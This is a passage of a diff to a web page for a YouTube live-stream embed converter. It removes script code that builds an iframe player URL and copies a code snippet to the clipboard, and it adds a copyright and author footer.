-                    embedUrl = `https://HelloPeopleTv4you.github.io/Youtube-Live-Stream-To-Embed-Convert/Player.html?id=${youtubeChannel}`;
-                } else if (playerType === "channel_username") {
-                    embedUrl = `https://HelloPeopleTv4you.github.io/Youtube-Live-Stream-To-Embed-Convert/Player.html?id=${youtubeChannel}`;
-                }
-                dynamicIframe.src = embedUrl;
-                iframeContainer.style.display = "block";
-            } else {
-                alert("Please enter a valid YouTube Channel ID or Username.");
-            }
-        }
-
-        // Function to copy the code to clipboard
-        function copyCode() {
-            const codeSnippet = document.querySelector(".code-snippet pre").innerText;
-            navigator.clipboard.writeText(codeSnippet).then(() => {
-                alert("Code copied to clipboard!");
-            });
-        }
-    </script>
+    <!-- Footer -->
+    <footer class="footer">
+        <p>&copy; 2024 m3u8 to iframe Converter. All rights reserved.</p>
+        <p>Author: HelloPeopleTv4you - Distributed By: <a href="#" target="_blank" title="HelloPeopleTv4you">HelloPeopleTv4you</a></p>
+    </footer>
 </body>
 </html>
